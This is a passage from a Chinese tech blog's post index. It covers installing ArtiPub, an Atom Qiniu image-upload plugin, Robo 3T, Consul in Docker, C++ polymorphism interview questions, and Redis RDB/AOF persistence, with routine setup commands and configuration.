ArtiPub 前，请确保已安装好 Docker 以及 Docker Compose。在项目目录下创建 docker-compose.yml 文件，输入如下内容： 1234567891011121314151617181920version: \'3.3\'services: app: image: "tikazyq/artipub:latest" container_name: "artipub-server" environment: MONGO_HOST: "mongo" ARTIPUB_API_ADDRESS: "http://localhost:3000" # 后端服务的API地址，如果后端服务不是安装在本机，请修改为协议 + 服务器 IP 地址 + 端口号（默认端口为 3000） ports: - "8000:8000" # 前端服务 - "3000:3000" # 后端服务 depends_on: - mongo mongo: image: mongo:latest container_name: "artipub-mongo" restart: always ports: - "27017:27017" 由于 ArtiPub 采用了前后端分离的架构，前端使用 Nginx 作为 Web 服务器，如果需要对 Nginx 进行配置（例如配置跨域），此时可以使用数据卷来挂载 Nginx 的配置文件到 ArtiPub 的容器内，ArtiPub 的 Nginx 配置文件路径为：/etc/nginx/conf.d/artipub.conf： 12345678910111213141516171819202122version: \'3.3\'services: app: image: "tikazyq/artipub:latest" container_name: "artipub-server" environment: MONGO_HOST: "mongo" ARTIPUB_API_ADDRESS: "http://localhost:3000" ports: - "8000:8000" - "3000:3000" depends_on: - mongo mongo: image: mongo:latest container_name: "artipub-mongo" restart: always ports: - "27017:27017" volumes: - \'/usr/local/docker-volumes/artipub/artipub.conf:/etc/nginx/conf.d/artipub.conf\' 创建并启动 ArtiPub 的容器，启动完成后在浏览器中访问 http://127.0.0.1:8000，可以看到 Web 管理界面： 12345# 后台启动# docker-compose up -d# 查看输出的日志信息# docker logs artipub-server --tail 100 -f MongoDB 数据库管理命令： 1234567891011# 登录MongoDB# docker exec -it artipub-mongo mongo# 显示所有数据库&gt; show dbs# 切换数据库&gt; use artipub# 查看数据库的所有集合&gt; show collections NPM 包安装 ArtiPub 软件依赖 软件版本 NodeJS 8.12+ MongoDB 3.6+ 123456789101112131415# 提示：通过 NPM 包安装 ArtiPub，需要提前手动安装好 MongoDB# 安装# npm install -g artipub# 或者指定镜像源来安装，加快下载速度# npm install -g artipub --registry=https://registry.npm.taobao.org# 启动# artipub start# 默认会使用 "127.0.0.1:27017/artipub" 作为MongoDB的数据库链接，使用如下命令可以配置数据库信息等# artipub -h# 成功启动后，在浏览器中访问 `http://127.0.0.1:8000`，可以看到 Web 管理界面 源码安装 ArtiPub123456789101112131415161718192021222324# 提示：通过源码安装 ArtiPub，需要提前手动安装好 MongoDB# 克隆源码# git clone https://github.com/crawlab-team/artipub# 进入源码目录# cd artipub# 安装# npm install# 配置数据库# vim ./config.js# 配置后端服务的API地址# vim ./src/config/config.ts # 将 apiEndpoint 改成对应的 IP 地址 + 端口。# 启动前端服务# npm run start:frontend# 启动后端服务# npm run start:backend# 成功启动后，在浏览器中访问 `http://127.0.0.1:8000`，可以看到 Web 管理界面 ArtiPub 登录助手的使用ArtiPub 需要依赖登录助手（Chrome 浏览器插件）来获取用户在各个平台的账号信息，因此需要手动安装登录助手插件。ArtiPub 成功启动后，通过 http://127.0.0.1:8000 访问 Web 管理界面，点击页面上的 “登录助手” 菜单项，然后按照以下步骤安装插件： 点击” 下载登陆助手”，保存文件名为 artipub-helper.zip 在 Chrome 浏览器中输入 chrome://extensions，并开启开发者模式（点击右上角） 将下载的登陆助手文件 artipub-helper.zip 拖入浏览器中，浏览器将自动安装插件（如果不能拖拽，请刷新页面后重试） 在使用登陆助手之前，请确保各个平台的账号已经处于登陆状态 浏览器右上角点击安装好的插件图标，点击” 一键获取登陆信息”，插件将获取所有平台的 Cookie 注意：如果 ArtiPub 的后端服务没有部署在本机，请点击浏览器右上角的登录助手里的” 扳手” 按钮，输入后端服务的 IP 地址 + 端口号（默认 3000），然后再获取登陆信息 到” 平台管理” 页面，点击” 更新 Cookie 状态”（需要大约 1 分钟），然后查看 “Cookie 状态”，确保其为” 已导入” 状态 到” 文章管理” 页面，点击” 发布”，选择登陆方式为 “Cookie”，然后发布文章 ArtiPub 界面平台管理界面 文章管理界面 文章发布界面 文章编辑界面 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"Atom 编写 Markdown 将图片上传到七牛图床",url:"/posts/410644c5.html",text:'前言 七牛云免费提供 30 天有效期的七牛融合 CDN 测试域名，也支持绑定自定义域名，但要求自定义的域名必须备案 七牛云每月会免费提供 10 GB 存储空间、10 GB 下载流量、10 万次 PUT 请求、100 万次 GET 请求，但免费提供的存储资源只支持 HTTP 协议访问，若需要使用 HTTPS 协议，则需要按流量付费才能够使用 Atom 编写 Markdown 将图片到七牛图床，第一种方法是安装两款插件，分别是：markdown-assistant + qiniu-uploader，不支持上传本地文件到七牛云，只支持将剪贴面板里的图片上传到七牛云，在新版本的 Atom 中存在兼容性问题 Atom 编写 Markdown 将图片到七牛图床，第二种方法直接安装 md-writer-qiniu 插件，该插件是在 markdown-writer 的基础上新增了七牛图片上传的功能，支持上传本地图片到七牛云，支持将剪贴面板里的图片保存到本地或者上传到七牛云 Atom 安装 md-writer-qiniu 插件 12345678910111213# 进入 Atom 本地的插件目录$ cd ~/.atom/packages# 克隆代码，文件夹的名称必须是 markdown-writer ，即需要和 packagename 一致，否则插件无法正常使用$ git clone https://github.com/chenghm123/md-writer-qiniu.git markdown-writer# 进入源码目录$ cd markdown-writer# 安装依赖$ npm install# 重启 Atom md-writer-qiniu 快捷键冲突 md-writer-qiniu 的快捷键默认是 shift-ctrl-i，可能会与 toggle-dev-tools 的快捷键冲突，可以编辑 ~/.atom/keymap.cson 文件，更改 md-writer-qiniu 的快捷键，即下面的 "shift-ctrl-v": "markdown-writer:insert-image"： 1234567891011121314$ vim ~/.atom/keymap.cson".platform-linux atom-text-editor:not([mini])": "shift-ctrl-K": "markdown-writer:insert-link" "shift-ctrl-v": "markdown-writer:insert-image" "shift-ctrl-X": "markdown-writer:toggle-taskdone" "ctrl-i": "markdown-writer:toggle-italic-text" "ctrl-b": "markdown-writer:toggle-bold-text" "ctrl-\'": "markdown-writer:toggle-code-text" "ctrl-h": "markdown-writer:toggle-strikethrough-text" "ctrl-1": "markdown-writer:toggle-h1" "ctrl-2": "markdown-writer:toggle-h2" "ctrl-3": "markdown-writer:toggle-h3" "ctrl-4": "markdown-writer:toggle-h4" "ctrl-5": "markdown-writer:toggle-h5" md-writer-qiniu 插件配置 首先注册七牛云的账号，选择” 对象存储” 产品，然后创建存储空间（必须设置为公开访问），接着在 Atom 的插件配置中填写以下内容即可。 Qiniu Bucket 是七牛云存储空间的名称 Qiniu Domain 是七牛云存储空间的域名 AccessKey、SecretKey 即是在七牛云中的 AK、SK 如果希望将剪贴面板里的图片保存到本地目录，需要配置 Hexo 图片的默认保存目录，下述配置是将图片保存在 source/asset/{year}/{month} 本地目录下： md-writer-qiniu 插件的使用 使用快捷方式 shift-ctrl-i 或者 shift-ctrl-v，调出图片上传的界面（如下图），也可以导航到菜单： Packages –&gt; Markdown Writer –&gt; Markup –&gt; Insert Image。在下面的操作完成后，默认按下” 回车键 “，即表示开始上传图片或者保存图片到 Hexo 的图片目录。 第一种使用情况：当剪贴面板里有图片时，如果勾选了 “Save Image To”，则只会将剪贴面板里的图片保存到 Hexo 的图片目录，此时并不会上传到七牛云；若不勾选，则默认会将剪贴面板里的图片上传到七牛云。 第二种使用情况：当剪贴面板里没有图片时，此时点击 “Choose Local Image” 按钮从本地选择图片，若勾选了 ”Copy Image To”，则只会当本地图片保存到 Hexo 的图片目录，此时并不会上传到七牛云；若不勾选，则默认会将本地图片上传到七牛云。 使用总结： 若不勾选 ”Save Image To“或者 “Copy Image To” 选项，默认会将剪贴面板里的图片或者本地图片上传到七牛云 只要勾选了 ”Save Image To“或者 “Copy Image To” 选项，都不会将剪贴面板里的图片或者本地图片上传到七牛云 补充说明 使用上面提到的 md-writer-qiniu 插件将图片上传到七牛云后，默认的图片路径是 {YYYY}/{MM}/{DD}/{HHmmss}{random-string}{extname} 的格式， 该插件不支持自定义七牛云里的图片文件名 若需要自定义七牛云里的图片文件名，可以使用这个分支的 md-writer-qiniu 插件（安装方法和上面的插件一样），支持使用路径前缀（针对七牛云的存储路径）。当在该插件的配置项里不勾选 Qiniu File Random Name 选项时，默认的图片路径是 {keyPrefix}/{YYYY}/{MM}/{title}{extname}，也就是说可以指定 Title 作为七牛云图片的文件名，具体配置如下图： var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"日常网站收藏",url:"/posts/16fab331.html",text:'博客 云风的 BLOG 稚晖的 BLOG（博主入选了华为天才少年计划） 电影资源 人人电影网 人人电影网（备用） PDF 资源 PDF 电子书 Docker 加速 Docker 的安装包以及周边高速镜像 网站测速、网站优化工具 站长工具 - 网速测试 GTmetrix - 网站速度诊断 Webkaka - 网站速度测试 Webkaka - 网站速度诊断 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"生活随笔"},{title:"Linux 安装 Robo 3T（Robomongo）",url:"/posts/1f8b78c4.html",text:'相关站点 Robo 3T 官网 Robo 3T 官方下载 Robo 3T Github 项目 Robo 3T Snap Github 项目 介绍 Robo 3T 是一款跨平台的 MongoDB 可视化工具，在管理数据库内容以及数据库代码编辑方面提供一定的开发优化方案，内置一个代码编辑区域，支持将数据库文件放到软件上修改，结合图形化的处理方式，可以将 MongoDB 数据库中的文件转换为分布式的存储方式，提高数据文件编辑和保存效率。Robo 3T 的前身是 Robomongo，在新版本中，可以更加方便地查找数据库对象、利用其中的数据生成器，可以将 Excel 文件的数据导入数据库中保存，对于制作数据文件来说是非常方便的。 安装说明 由于 Robo 3T 是基于 C++ 开发的，为了避免安装过程中可能出现的 GLibc 依赖错误，下面直接通过 Snap 来安装 Robomongo，这样也方便以后管理软件的更新，此安装方式适用于 Centos、Debian、Ubuntu 等 Liinux 发行版。 12345678910111213141516171819202122# 安装# snap install robo3t-snap# 查看安装状态# snap list# 创建快捷方式# vim /usr/share/applications/robo3t.desktop[Desktop Entry]Name=Robo3tComment=Robo 3T (formerly Robomongo) is the free lightweight GUI for MongoDB enthusiasts.Exec=/snap/bin/robo3t-snap %UTerminal=falseType=ApplicationIcon=/var/lib/snapd/snap/robo3t-snap/current/meta/gui/icon.pngCategories=GNOME;GTK;Development;MimeType=text/plain;# 菜单栏导航到：应用程序 --&gt; 编程 --&gt; Robo3t，直接点击快捷方式启动应用，应用启动后的界面截图如下# 或者直接使用命令来启动（使用普通用户权限）$ /snap/bin/robo3t-snap Robo 3T 界面 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux 开发工具"},{title:"Docker 安装 Consul",url:"/posts/224f5100.html",text:'相关站点 Consul 官方安装教程 Consul Docker 官方安装教程 拉取 Consul 镜像 12345# 拉取最新版本的镜像# docker pull consul:latest# 拉取特定版本的镜像# docker pull consul:1.7.3 Docker 安装 Consul（单机） 1234567# 创建并启动容器，默认是以开发模式启动，数据保存在内存中# docker run -d --name=consul -e CONSUL_BIND_INTERFACE=eth0 consul:1.7.3# 查看容器的运行状态# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7c43babcc760 consul:1.7.3 "docker-entrypoint.s…" 38 seconds ago Up 37 seconds 8300-8302/tcp, 8500/tcp, 8301-8302/udp, 8600/tcp, 8600/udp consul Docker 安装 Consul（集群） 下面将演示在开发模式下，如何创建拥有 3 个节点的 Consul 集群，数据默认保存在内存中，开发模式下可以直接通过 8500 端口访问 Consul 的 WebUI 界面。 12345678910111213141516171819202122232425262728# 创建并启动第一个节点# docker run -d --name=consul-node1 -p 8500:8500 -e CONSUL_BIND_INTERFACE=eth0 consul:1.7.3# 查看第一个节点的IP# docker inspect -f=\'{{.NetworkSettings.IPAddress}}\' consul-node1# 创建并启动第二个节点，172.17.0.3是第一个节点的IP# docker run -d --name=consul-node2 -p 8500:8500 -e CONSUL_BIND_INTERFACE=eth0 consul:1.7.3 agent -dev -join=172.17.0.3# 创建并启动第三个节点，172.17.0.3是第一个节点的IP# docker run -d --name=consul-node3 -p 8500:8500 -e CONSUL_BIND_INTERFACE=eth0 consul:1.7.3 agent -dev -join=172.17.0.3# 查看容器的运行状态# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES1ac5832f79f4 consul:1.7.3 "docker-entrypoint.s…" 31 seconds ago Up 30 seconds 8300-8302/tcp, 8500-8500/tcp, 8301-8302/udp, 8600/tcp, 8600/udp consul-node3533b0f12877a consul:1.7.3 "docker-entrypoint.s…" 56 seconds ago Up 55 seconds 8300-8302/tcp, 8500-8500/tcp, 8301-8302/udp, 8600/tcp, 8600/udp consul-node2d25f90dffa94 consul:1.7.3 "docker-entrypoint.s…" 2 minutes ago Up 2 minutes 8300-8302/tcp, 8500-8500/tcp, 8301-8302/udp, 8600/tcp, 8600/udp consul-node1# 在第一个容器中运行consul命令来查询集群中的所有成员# docker exec -t consul-node1 consul membersNode Address Status Type Build Protocol DC Segment1ac5832f79f4 172.17.0.5:8301 alive server 1.7.3 2 dc1 &lt;all&gt;533b0f12877a 172.17.0.4:8301 alive server 1.7.3 2 dc1 &lt;all&gt;d25f90dffa94 172.17.0.3:8301 alive server 1.7.3 2 dc1 &lt;all&gt;# 访问web管理界面# 浏览器访问：http://172.17.0.3:8500 Consul 容器的持久化 在开发模式下启动 Consul 容器，数据默认保存在内存中，容器重启后数据会丢失；若想使用 Docker 的数据卷持久化容器里的数据，可以挂载以下目录，如 docker -v /usr/share/consul/data:/consul/data。 /consul/data：Consul 存放数据的目录 /consul/config：Consul 存放配置文件的目录 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"C++ 基础面试题之一",url:"/posts/c62ca067.html",text:'多态请谈谈对多态的理解 多态的实现效果 多态是在运行期间根据具体对象的类型决定函数调用，同样的调用语句有多种不同的表现形态 多态实现的三个必要条件 有继承、有虚函数（virtual ）的重写、有父类的指针（引用）指向子类对象 多态的 C++ 实现 使用 virtual 关键字，告诉编译器这个函数要支持多态；不是根据指针类型判断如何调用，而是要根据指针所指向的实际对象类型来判断如何调用 多态的理论基础 动态联编 Vs 静态联编，根据实际的对象类型来判断重写函数的调用 多态的重要意义 多态是设计模式的基础，是框架的基石 实现多态的理论基础 函数指针做函数参数 函数指针一般有两种用法（正、反） 多态原理的探究 与面试官展开讨论 谈谈对重写与重载理解 函数重载 必须在同一个类中进行 子类无法重载父类的函数，父类同名函数将被子类的覆盖 重载是在编译期间根据参数类型、个数和顺序决定函数的调用 函数重写 必须发生于父类与子类之间 父类与子类中的函数必须有完全相同的原型 使用 virtual 关键字声明之后，能够产生多态（如果不使用 virtual 关键字声明，那叫重定义） 在父类的构造函数中调用虚函数，能实现多态吗子类的 VPTR 指针是分步完成初始化的，当执行父类的构造函数时，子类 的 VPTR 指针指向父类的虚函数表，当父类的构造函数执行完毕后，会把子类的 VPTR 指针指向子类的虚函数表。因此，在父类的构造函数中调用虚函数，不能实现多态。 分析图解 如图 所示 对象在创建的时，由编译器对 VPTR 指针进行初始化 只有当对象的构造全部完成后，VPTR 指针的指向才能最终确定 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"Manjaro 安装图解教程",url:"/posts/eadad846.html",text:'官方桌面环境比较 XFCE 资源占用少，稳定 GNOME 定制性差，资源占用中等 KDE 定制性高，资源占用多，运行比较卡 官方桌面环境图 社区桌面环境图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"manjaro"},{title:"浅谈 Redis 持久化 - RDB 和 AOF 原理",url:"/posts/b9abccfa.html",text:'持久化什么是持久化持久化（Persistence），即把数据（如内存中的对象）保存到可永久保存的存储设备中（如磁盘）。 持久化的实现方式 快照方式持久化：在某时刻把所有数据进行完整备份，例如：MySQL 的 Dump 方式、Redis 的 RDB 方式 写日志方式持久化：把用户执行的所有写指令（增删改）备份到文件中，还原数据时只需要把备份的所有指令重新执行一遍即可，例如：MySQL 的 Binlog、Redis 的 AOF、Hbase 的 HLog RDBRDB 介绍RDB 持久化方式是在指定的时间间隔内将内存中的数据集快照写入磁盘（point-in-time snapshot）。在默认情况下，Redis 将数据库快照保存在名字为 dump.rdb 的二进制文件中。在 Redis 运行时，RDB 程序将当前内存中的数据库快照保存到磁盘文件中，在 Redis 重启动时，RDB 程序可以通过载入 RDB 文件来还原数据库的状态。 RDB 工作原理当 Redis 需要保存 dump.rdb 二进制文件时，服务器会执行以下操作。整个过程中，Redis 的主进程不进行任何 I/O 操作，这就确保了极高的性能，使 Redis 可以从写时复制（copy-on-write）机制中获益。 Redis 单独创建（fork）一个子进程 子进程将内存中的数据集写入到一个临时 RDB 文件中 当子进程完成对临时 RDB 文件的写入时，Redis 用临时 RDB 文件替换旧的 RDB 文件，并删除旧的 RDB 文件 RDB 的三种主要触发机制save 命令（同步）save 命令会执行一个同步操作，以 RDB 文件的方式保存所有数据的快照。特别注意，由于 save 命令是同步命令，会占用 Redis 的主进程，若 Redis 的数据量非常大时，save 命令执行速度会非常慢，会阻塞所有客户端的请求。因此很少在生产环境直接使用 save 命令，可以使用 bgsave 命令代替。如果 bgsave 命令的保存数据的子进程发生错误，导致无法备份时，那么用 save 命令保存最新的数据是最后的手段。 bgsave 命令（异步）Redis 使用 Linux 系统的 fock() 生成一个子进程来将数据库数据保存到磁盘，主进程继续提供服务以供客户端调用。如果操作成功，可以通过客户端命令 LASTSAVE 来检查操作结果。 save 命令与 bgsave 命令对比如下，特别注意，shutdown、slave 命令也会触发数据快照的创建 自动生成 RDB 文件除了手动执行 save 和 bgsave 命令实现 RDB 持久化以外，Redis 还提供了自动自动生成 RDB 文件的方式。通过配置文件对 Redis 进行设置，让它在 “N 秒内数据集至少有 M 个改动” 这一条件被满足时，自动进行数据集保存操作。比如说，以下设置会让 Redis 在满足 “60 秒内有至少有 1000 个键被改动” 这一条件时，自动进行数据集保存操作： 1save 60 1000 RDB 相关配置12345678910111213141516171819202122232425# RDB自动持久化规则# 当 900 秒内有至少有 1 个键被改动时，自动进行数据集保存操作save 900 1# 当 300 秒内有至少有 10 个键被改动时，自动进行数据集保存操作save 300 10# 当 60 秒内有至少有 10000 个键被改动时，自动进行数据集保存操作save 60 10000# RDB持久化文件名dbfilename dump-&lt;port&gt;.rdb# 数据持久化文件存储目录dir /var/lib/redis# bgsave发生错误时是否停止写入，通常为yesstop-writes-on-bgsave-error yes# rdb文件是否使用压缩格式rdbcompression yes# 是否对rdb文件进行校验和检验，通常为yesrdbchecksum yes RDB 的优点 RDB 是一个非常紧凑的文件，它保存了某个时间点的数据集，非常适用于数据集的备份，比如可以在每个小时保存一下过去 24 小时内的数据，同时每天保存过去 30 天的数据，这样即使出了问题也可以根据需求恢复到不同版本的数据集，非常适合做冷备 RDB 是一个紧凑的单一文件，很方便传送到另一个远端数据中心或者亚马逊的 S3（可能加密），非常适用于灾难恢复 RDB 在保存 RDB 文件时，父进程唯一需要做的就是 fork 出一个子进程，接下来的工作全部由子进程来做，父进程不需要再做其他 I/O 操作，所以 RDB 持久化方式可以最大化地提高 Redis 的性能 若需要进行大规模数据的恢复，且对于数据恢复的完整性不是非常敏感，那么 RDB 方式要比 AOF 方式的数据恢复速度更快 RDB 的缺点 耗时、耗性能：RDB 需要经常 fork 子进程来保存数据集到硬盘上，当数据集比较大的时候，fork 的过程是非常耗时的，可能会导致 Redis 在毫秒级内不能响应客户端的请求。如果数据集巨大并且 CPU 性能不是很好的情况下，这种情况可能会持续数毫秒或者几秒，AOF 也需要 fork，但可以调节重写日志文件的频率来提高数据集的耐久度 不可控、丢失数据：如果希望在 Redis 意外停止工作（例如机房断电）的情况下尽量减少数据的丢失，那么 RDB 不适合这种场景。虽然可以配置不同的 save 时间点（例如每隔 5 分钟且对数据集有 100 个写的操作时进行备份)，但 Redis 要完整的保存整个数据集是一个比较繁重的工作，通常会每隔 5 分钟或者更久做一次完整的保存，万一在 Redis 意外宕机，可能会丢失几分钟的数据。简单来说，最后一次 RDB 持久化后的数据可能会丢失。 AOFAOF 介绍快照功能（RDB）并不是非常耐久（durable），如果 Redis 因为某些原因而造成故障停机，那么服务器将丢失最近写入且仍未保存到快照中的那些数据。 从 1.1 版本开始，Redis 增加了一种完全耐久的持久化方式，那就是 AOF 持久化。AOF 以日志的形式来记录每个写操作，将 Redis 执行过的所有写指令记录下来，同时只许追加文件不能改写文件。在配置文件中启用 AOF（如下配置） 后，每当 Redis 执行一个改变数据集的命令时（比如 SET），这个命令就会被追加到 AOF 文件的末尾。这样的话，当 Redis 重新启时，程序就可以通过重新执行 AOF 文件中的命令来达到重建数据集的目的。 1appendonly yes AOF 运行原理AOF 运行原理（创建与恢复）如下： AOF 持久化的三种同步策略可以通过配置文件配置 Redis 多久才将命令 fsync 到磁盘一次，Redis 提供了以下三种策略。 always：每次有新命令需要追加到 AOF 文件时就执行一次 fsync 操作，非常慢，也非常安全 everysec：每秒 fsync 一次，速度足够快（和使用 RDB 持久化差不多），并且在故障时只会丢失 1 秒钟的数据，推荐（并且也是默认）的配置为每秒 fsync 一次， 这种 fsync 策略可以兼顾速度和安全性。 no：从不 fsync，将数据交给操作系统来处理，由操作系统来决定什么时候同步数据，速度更快，但也更不安全 always、everysec、no 三种策略的对比如下： AOF 重写AOF 重写介绍因为 AOF 的运作方式是不断地将命令追加到文件的末尾，所以随着写入命令的不断增加，AOF 文件的体积也会变得越来越大。举个例子，如果对一个计数器调用了 100 次 INCR ，那么仅仅是为了保存这个计数器的当前值，AOF 文件就需要使用 100 条记录（entry）。然而在实际上，只使用一条 SET 命令已经足以保存计数器的当前值了，其余 99 条记录实际上都是多余的。为了处理这种情况， Redis 支持一种有趣的特性，可以在不打断服务客户端的情况下，对 AOF 文件进行重建（rebuild）。执行 bgrewriteaof 命令，Redis 将生成一个新的 AOF 文件，这个文件包含重建当前数据集所需的最少命令。Redis 2.2 需要自己手动执行 bgrewriteaof 命令，而 Redis 2.4 之后则可以通过配置自动触发 AOF 重写。通过 AOF 重写，可以减少磁盘占用量、加速数据恢复，AOF 重写的对比图如下： AOF 重写的实现方式bgrewriteaof 命令 Redis 的 bgrewriteaof 命令用于异步执行一个 AOF（Append Only File）文件重写操作，重写后会创建一个当前 AOF 文件的体积优化版本。即使 bgrewriteaof 命令执行失败，也不会有任何数据丢失，因为旧的 AOF 文件在 bgrewriteaof 命令执行成功之前不会被修改。AOF 重写操作由 Redis 自行触发，bgrewriteaof 命令仅仅用于手动触发 AOF 重写操作，整个流程如下： 如果一个子进程是 Redis 通过磁盘快照创建的，那么 AOF 重写将会在 RDB 操作终止后才开始保存，这种情况下 bgrewriteaof 命令依然会返回 OK 状态码。从 Redis 2.6 起，可以通过 info 命令查看 AOF 重写的执行情况 如果正在执行的 AOF 重写操作返回了一个错误，那么 AOF 重写将会在稍后一点的时间重新执行 AOF 重写配置 AOF 重写自动触发的条件 Redis 支持 AOF 重写自动触发机制，无需手动执行 bgrewriteaof 命令，但需要同时满足下面两个条件才会自动触发： aof_current_size &gt; auto-aof-rewrite-min-size (aof_current_size - aof_base_size) * 100 / aof_base_size &gt; auto-aof-rewrite-percentage 12auto-aof-rewrite-min-size 64mbauto-aof-rewrite-percentage 100 假设 Redis 的配置如上，当 AOF 文件的体积大于 64Mb，并且 AOF 文件的体积比上一次重写时的体积大了至少一倍（100%）时，Redis 将执行 bgrewriteaof 命令进行重写。 AOF 重写的流程Redis 首先 fork 子进程，子进程开始将新 AOF 文件的内容写入到临时文件。对于所有新执行的写入命令，父进程一边将它们累积到一个内存缓存中，一边将这些改动追加到现有 AOF 文件的末尾，这样即使在重写的中途发生宕机，现有的 AOF 文件也还是安全的。当子进程完成重写工作时，它给父进程发送一个信号，父进程在接收到信号之后，将内存缓存中的所有数据追加到新 AOF 文件的末尾。最后 Redis 原子地用新 AOF 文件替换旧 AOF 文件，之后所有命令都会直接追加到新 AOF 文件的末尾。 AOF 相关配置1234567891011121314151617181920# 开启AOF持久化方式appendonly yes# AOF持久化文件名appendfilename appendonly-&lt;port&gt;.aof# 每秒把缓冲区的数据同步到磁盘appendfsync everysec# 数据持久化文件存储目录dir /var/lib/redis# 是否在执行重写时不同步数据到AOF文件no-appendfsync-on-rewrite yes# 触发AOF文件执行重写的最小尺寸auto-aof-rewrite-min-size 64mb# 触发AOF文件执行重写的增长率auto-aof-rewrite-percentage 100 AOF 的优点 使用 AOF 会让 Redis 更加耐久：可以使用不同的 fsync 策略：无 fsync、每秒 fsync、每次写的时候 fsync。使用默认的是每秒 fsync 策略，Redis 的性能依然很好（fsync 是由后台子进程进行处理的，主线程会尽力处理客户端请求），一旦出现故障，最多丢失 1 秒的数据 AOF 对日志文件的写入操作采用的是 append 模式，因此在写入过程中即使出现磁盘空间已满、宕机等现象，也不会破坏日志文件中已经存在的内容。而且如果本次操作只是写入了一半数据就出现了系统崩溃问题，也不用担心，在 Redis 下一次启动之前，可以通过 redis-check-aof 工具来修复数据一致性问题 Redis 可以在 AOF 文件体积变得过大时，自动地在后台对 AOF 文件进行重写，重写后的新 AOF 文件包含了恢复当前数据集所需的最小命令集合。 整个重写操作是绝对安全的，因为 Redis 在创建新 AOF 文件的过程中，会继续将命令追加到现有的 AOF 文件里面，即使重写过程中发生宕机，现有的 AOF 文件也不会丢失。 而一旦新 AOF 文件创建完毕，Redis 就会从旧 AOF 文件切换到新 AOF 文件，并开始对新 AOF 文件进行追加操作 AOF 文件有序地保存了对数据库执行的所有写入操作，这些写入操作以 Redis 协议的格式保存，因此 AOF 文件的内容非常容易被人读懂，对文件进行分析（parse）也很轻松。 导出（export） AOF 文件也非常简单。举个例子，如果不小心执行了 FLUSHALL 命令，但只要 AOF 文件未被重写，那么只要停止服务器，移除 AOF 文件末尾的 FLUSHALL 命令，并重启 Redis，就可以将数据集恢复到 FLUSHALL 执行之前的状态 AOF 的缺点 对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积，而且 RDB 在恢复大数据集时的速度比 AOF 的恢复速度要快 根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB。AOF 开启后支持写的 QPS 会比 RDB 支持的写的 QPS 低，但在一般情况下，每秒 fsync 的性能依然非常高，而关闭 fsync 可以让 AOF 的速度和 RDB 一样快，即使在高负荷之下也是如此。不过在处理巨大的写入载入时，RDB 可以提供更有保证的最大延迟时间（latency） 修复错误的 AOF 文件服务器可能在 Redis 正在对 AOF 文件进行写入时宕机，如果宕机造成了 